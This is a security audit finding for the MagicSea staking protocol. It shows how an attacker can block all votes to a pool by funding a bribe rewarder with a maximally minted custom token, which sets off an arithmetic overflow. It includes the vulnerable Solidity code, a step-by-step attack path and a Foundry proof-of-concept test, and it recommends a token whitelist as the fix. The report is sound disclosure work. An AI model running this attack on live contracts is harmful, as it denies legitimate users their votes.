# santipu_ - Attacker can block all votes to a specific pool by triggering an overflow error

**Severity:** high
**Auditor:** Sherlock
**Protocol:** MagicSea Staking
**Keywords:** cyber security, vulnerability, BribeRewarder, overflow error, MagicSea protocol, bribing mechanism, custom token, minting tokens, accDebtPerShare, transaction revert, totalRewards, totalSupply, legitimate users, voting functionality, attack path, malicious contracts, whitelist of tokens, mitigation, gaming the system, contract upgrade

---

santipu_

High

# Attacker can block all votes to a specific pool by triggering an overflow error

## Summary

An attacker can deploy a \u0060BribeRewarder\u0060 contract using a custom token and distribute a huge number of those tokens to trigger an overflow error and prevent users from voting in a specific pool.

## Vulnerability Detail

In the MagicSea protocol, bribing is a core mechanism. In short, users can permissionlessly create \u0060BribeRewarder\u0060 contracts and fund them with tokens to bribe users in exchange for voting in specific pools. 

When users vote for a specific pool through calling \u0060Voter::vote\u0060, the function \u0060_notifyBribes\u0060 is called, which calls each \u0060BribeRewarder\u0060 contract that is attached to that voted pool:

\u0060\u0060\u0060solidity
function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
    IBribeRewarder[] storage rewarders = _bribesPerPriod[periodId][pool];
    for (uint256 i = 0; i < rewarders.length; ++i) {
        if (address(rewarders[i]) != address(0)) {
>>>         rewarders[i].deposit(periodId, tokenId, deltaAmount);
            _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
        }
    }
}
\u0060\u0060\u0060

An attacker can use this bribing mechanism to create malicious \u0060BribeRewarder\u0060 contracts that will revert the transaction each time a user tries to vote for a specific pool. The attack path is the following:

1. An attacker creates a custom token and mints the maximum amount of tokens (\u0060type(uint256).max\u0060).
2. The attacker creates a \u0060BribeRewarder\u0060 contract using the custom token.
3. The attacker transfers the total supply of the token to the rewarder contracts and sets it up to distribute the whole supply only in one period to a specific pool.
4. When that period starts, the attacker first uses 1 wei to vote for the selected pool, which will initialize the value of \u0060accDebtPerShare\u0060 to a huge value.
5. When other legitimate users go to vote to that same pool, the transaction will revert due to overflow.

In step 4, the attacker votes using 1 wei to initialize \u0060accDebtPerShare\u0060 to a huge value, which will happen here:

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L161
\u0060\u0060\u0060solidity
    function updateAccDebtPerShare(Parameter storage rewarder, uint256 totalSupply, uint256 totalRewards)
        internal
        returns (uint256)
    {
        uint256 debtPerShare = getDebtPerShare(totalSupply, totalRewards);

        if (block.timestamp > rewarder.lastUpdateTimestamp) rewarder.lastUpdateTimestamp = block.timestamp;

>>     return debtPerShare == 0 ? rewarder.accDebtPerShare : rewarder.accDebtPerShare += debtPerShare;
    }

    function getDebtPerShare(uint256 totalDeposit, uint256 totalRewards) internal pure returns (uint256) {
>>     return totalDeposit == 0 ? 0 : (totalRewards << Constants.ACC_PRECISION_BITS) / totalDeposit;
    }
\u0060\u0060\u0060

In the presented scenario, the value of \u0060totalRewards\u0060 will be huge (close to \u0060type(uint256).max\u0060) and the value of \u0060totalSupply\u0060 will only be 1, which will cause the \u0060accDebtPerShare\u0060 ends up being a huge value. 

Later, when legitimate voters try to vote for that same pool, the transaction will revert due to overflow because the operation of \u0060deposit * accDebtPerShare\u0060 will result in a value higher than \u0060type(uint256).max\u0060:

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L27-L29
\u0060\u0060\u0060solidity
function getDebt(uint256 accDebtPerShare, uint256 deposit) internal pure returns (uint256) {
    return (deposit * accDebtPerShare) >> Constants.ACC_PRECISION_BITS;
}
\u0060\u0060\u0060

## Impact

By executing this sequence, an attacker can block all votes to specific pools during specific periods. If wanted, an attacker could block ALL votes to ALL pools during ALL periods, and the bug can only be resolved by upgrading the contracts or deploying new ones. 

There aren\u0027t any external requirements or conditions for this attack to be executed, which means that the voting functionality can be gamed or completely hijacked at any point in time. 

## PoC

The following PoC can be pasted in the file called \u0060BribeRewarder.t.sol\u0060 and can be executed by running the command \u0060forge test --mt testOverflowRewards\u0060.

\u0060\u0060\u0060solidity
function testOverflowRewards() public {
    // Create custom token
    IERC20 customRewardToken = IERC20(new ERC20Mock("Custom Reward Token", "CRT", 18));

    // Create rewarder with custom token
    rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(customRewardToken, pool))));

    // Mint the max amount of custom token to rewarder
    ERC20Mock(address(customRewardToken)).mint(address(rewarder), type(uint256).max);

    // Start bribes
    rewarder.bribe(1, 1, type(uint256).max);

    // Start period
    _voterMock.setCurrentPeriod(1);
    _voterMock.setStartAndEndTime(0, 2 weeks);

    vm.warp(block.timestamp + 10);

    // Vote with 1 wei to initialize \u0060accDebtPerShare\u0060 to a huge value
    vm.prank(address(_voterMock));
    rewarder.deposit(1, 1, 1);

    vm.warp(block.timestamp + 1 days);

    // Try to vote with 1e18 -- It overflows
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e18);

    // Try to vote with 1e15 -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e15);

    // Try now for a bigger vote -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1_000e18);
}
\u0060\u0060\u0060

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Rewarder2.sol#L28

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to create a whitelist of tokens that limits the tokens that can be used as rewards for bribing. This way, users won\u0027t be able to distribute a huge amount of tokens and block all the voting mechanisms. 


